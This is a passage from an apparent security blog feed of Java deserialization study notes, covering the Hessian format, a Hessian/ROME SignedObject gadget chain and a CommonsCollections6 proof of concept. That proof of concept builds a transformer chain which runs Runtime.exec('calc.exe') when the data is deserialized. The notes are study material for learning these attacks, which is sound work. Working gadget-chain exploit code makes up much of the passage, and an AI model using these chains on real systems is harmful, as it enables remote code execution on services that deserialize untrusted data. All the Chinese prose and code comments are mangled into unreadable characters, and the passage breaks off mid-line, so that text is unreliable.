class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException, toStringBean);<br><br><br>        KeyPairGenerator keyPairGenerator;<br>        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(SignedObject.class, so);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, delegate);<br><br><br>        HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(os);<br>        output.writeObject(map);<br><br><br>        <span class="hljs-type">byte</span>[] serializedData = os.toByteArray();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(is);<br>        hi.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessianååºåˆ—åŒ–</title>
    <link href="/2022/03/28/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/03/28/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessianååºåˆ—åŒ–"><a href="#Hessianååºåˆ—åŒ–" class="headerlink" title="Hessianååºåˆ—åŒ–"></a>Hessianååºåˆ—åŒ–</h1><p>ä¹‹å‰æ­å»ºäº†å¾ˆä¹…çš„Weblogicç¯å¢ƒï¼Œæœ€åè¿˜æ˜¯æ²¡æœ‰æ­å»ºæˆåŠŸã€‚éš¾å—ï¼Œçœ‹äº†Y4å¸ˆå‚…çš„æ–‡ç« +è™ç¬¦ã€‚æ¥ç§ç§è¿™ä¸ªæ–°ç©æ„ã€‚ï¼ˆ<strong>å­¦çš„æ¯”è¾ƒè‚¤æµ…</strong>ï¼‰</p><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age ;<br>    <span class="hljs-keyword">transient</span> String xs;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨äº†get&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨äº†set&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getXs</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setXs</span><span class="hljs-params">(String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, xs=&#x27;&quot;</span> + xs + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Twings&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>serialize(data);<br>unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br>        hessianOutput.writeObject(obj);<br>        byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-comment">//å†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>        fileOutputStream.write(byteArrayOutputStream.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//è¯»å–æ–‡ä»¶</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> fileInputStream.read(bytes);<br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hi.readObject();<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281134724.png" alt="QQæˆªå›¾20220328113346"></p><ul><li>transientå…³é”®å­—ä¿®é¥°çš„å±æ€§ä¸èƒ½è¢«åºåˆ—åŒ–ï¼›</li><li>hessianåºåˆ—åŒ–æ—¶ï¼Œä¸€å®šè¦æ³¨æ„å­ç±»å’Œçˆ¶ç±»ä¸èƒ½æœ‰åŒåå­—æ®µã€‚<a href="https://www.jianshu.com/p/6a36dd1fcca8">è¿™é‡Œæœ‰è§£é‡Š</a>ã€‚é™„ä¸Šæˆªå›¾ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281147761.png" alt="QQæˆªå›¾20220328114008"></p><ul><li>æ²¡æœ‰è°ƒç”¨setterï¼Œgetteræ–¹æ³•ã€‚</li></ul><h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>ç®€å•çš„Hessianååºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Twings&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">ho</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bos);<br>        ho.writeObject(data);<br><br><br>        <span class="hljs-type">byte</span>[] serializedData = bos.toByteArray();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(is);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hi.readObject();<br>        System.out.println(o);<br>   &#125;<br></code></pre></td></tr></table></figure><p>å¯¹æ¯”jdkååºåˆ—åŒ–æ¥è¯´ä¸ä¸€æ ·çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br></code></pre></td></tr></table></figure><p>ç»™å…¥å£ç‚¹ä¸‹ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315999.png" alt="QQæˆªå›¾20220328115553"></p><p>è·Ÿè¿›ã€‚ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ã€‚åœ¨**hessianInput#readObject()<strong>ä¸­ï¼Œå‘ç°è°ƒç”¨äº†</strong>readMap(this, type)**ã€‚è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315127.png" alt="QQæˆªå›¾20220328115815"></p><p>æ¥åˆ°<strong>UnsafeDesserialize#readMap()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281205473.png" alt="QQæˆªå›¾20220328120520"></p><p>è¿›å…¥å¾ªç¯ï¼Œå…ˆè°ƒç”¨<code>in.readObject()</code>ä»è¾“å…¥æµä¸­è·å–å±æ€§åç§°ï¼Œæ¥ç€ä»ä¹‹å‰ç¡®å®šå¥½çš„<code>this._fieldMap</code>ä¸­åŒ¹é…è¯¥å±æ€§å¯¹åº”çš„FieldDeserizlizerï¼Œç„¶åè°ƒç”¨åŒ¹é…ä¸Šçš„FieldDeserializerè¿›è¡Œå¤„ç†ã€‚</p><p>åç»­å¦‚æœä¼ å…¥çš„ç±»å‹æ˜¯mapï¼Œé‚£ä¹ˆå°±å¯ä¸€è°ƒç”¨è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315445.png" alt="QQæˆªå›¾20220329224157"></p><p>æˆ‘è°ƒè¯•äº†å¾ˆä¹…ï¼ˆåœ¨æˆ‘ä»¬ä¼ å…¥hashmapç±»å‹çš„æ—¶å€™å°±ä¼šè¿›å…¥è¿™ä¸ªå¸¦æœ‰å‚æ•°çš„<code>in.readObject</code>ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315372.png" alt="QQæˆªå›¾20220329225140"></p><p>ä¼šåœ¨è¿™é‡Œè¿›å…¥ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315899.png" alt="QQæˆªå›¾20220329225210"></p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>è¿™é‡Œä¸€ä¸‹æç„¶å¤§æ‚Ÿï¼Œè·Ÿä¹‹å‰çš„å¾ˆå¤šé“¾å­éƒ½å¾ˆç›¸ä¼¼ã€‚æ§åˆ¶keyï¼Œè°ƒç”¨å…¶hashcodeï¼Œå®Œæˆæ„é€ é“¾ã€‚<br>ä¹Ÿå°±æ˜¯Y4å¸ˆå‚…è¯´è¿™ä¸ªå¯ä»¥å’Œromeé“¾ç»“åˆçš„åŸå› ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections6</title>
    <link href="/2022/03/23/CommonsCollections6/"/>
    <url>/2022/03/23/CommonsCollections6/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollection6"><a href="#CommonCollection6" class="headerlink" title="CommonCollection6"></a>CommonCollection6</h1><p>ä¹‹å‰æ‡’çš„ç»§ç»­å¤ä¹ è¿™ä¸ªã€‚å¤ä¹ å®Œä¹‹åæ‰å‘ç°æˆ‘cc5é‡Œé¢å†™äº†ï¼Œä½†æ˜¯æœ€è¿‘çœ‹åˆ°å¾ˆå¤šéƒ½æ˜¯å¼€å¤´å°±åŸºäºcc6æ¥è¯´â€¦.emmmã€‚ï¼ˆä¸»è¦æ˜¯èƒ½æ‰“é«˜ç‰ˆæœ¬ã€‚<strong>åœ¨8u71ä¹‹åï¼Œï¼ŒJavaå®˜æ–¹ä¿®æ”¹äº† sun.reflect.annotation.AnnotationInvocationHandler çš„readObjectå‡½æ•°å…¶ä¸­çš„setvalueæ²¡æœ‰äº†</strong>ï¼‰<br>è€æ ·å­å…ˆæ¥çœ‹çœ‹åˆ©ç”¨é“¾ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">java.io.ObjectInputStream.readObject()<br>java.util.HashMap.readObject()<br>java.util.HashMap.hash()                 org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                  org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                       org.apache.commons.collections.map.LazyMap.get()          org.apache.commons.collections.functors.ChainedTransformer.transform()                      org.apache.commons.collections.functors.InvokerTransformer.transform()<br>java.lang.reflect.Method.invoke()<br>java.lang.Runtime.exec()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯ç”¨åˆ°äº†ä¸€äº›å…³äºcc1çš„çŸ¥è¯†ã€‚è¿™é‡Œå…ˆæ¥çœ‹ä¸€ä¸‹ä¹‹å‰æ²¡æœ‰è§è¿‡çš„ã€‚å¹¶ä¸”è¿™é‡Œå°±æ˜¯è¦æ‰¾å¯»å…¶ä»–ç±»è°ƒç”¨getæ–¹æ³•ï¼Œæ‰¾åˆ°äº†TiedMapEntry#hashCode()ã€‚</p><h2 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry#hashCode()"></a>TiedMapEntry#hashCode()</h2><p>è°ƒç”¨äº†getValue()</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232217452.png" alt="QQæˆªå›¾20220323221741"></p><p>ç»§ç»­å¾€ä¸‹èµ°ã€‚</p><h3 id="TiedMapEntry-getValue"><a href="#TiedMapEntry-getValue" class="headerlink" title="TiedMapEntry#getValue()"></a>TiedMapEntry#getValue()</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232219720.png" alt="QQæˆªå›¾20220323221855"></p><p>è¿™é‡Œè°ƒç”¨äº†getæ–¹æ³•ã€‚<br>æ¥ç€å›åˆ°ä¸Šé¢çš„<strong>hashcode()</strong>,å“ªé‡Œè°ƒç”¨äº†å®ƒï¼Ÿè‡ªç„¶è€Œç„¶æƒ³åˆ°<strong>hashmap</strong>ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè®¡ç®—hashmapä¸­çš„keyçš„hashcodeã€‚</p><h2 id="HashMap-ReadObject"><a href="#HashMap-ReadObject" class="headerlink" title="HashMap#ReadObject()"></a>HashMap#ReadObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345955.png" alt="QQæˆªå›¾20220323223935"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345894.png" alt="QQæˆªå›¾20220323224058"></p><p>è¿™é‡Œå°±ä¸åšè¿‡å¤šçš„è§£é‡Šäº†ã€‚<br>è¿™æ ·ä¸€ä¸ªå®Œæ•´çš„é“¾å­å°±å»ºç«‹äº†ã€‚</p><h2 id="pocï¼ˆä¸æˆåŠŸï¼‰"><a href="#pocï¼ˆä¸æˆåŠŸï¼‰" class="headerlink" title="pocï¼ˆä¸æˆåŠŸï¼‰"></a>pocï¼ˆä¸æˆåŠŸï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span>aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(outerMap,transformerChain );<br><br>        serialize(expMap);<br>        unserialize(<span 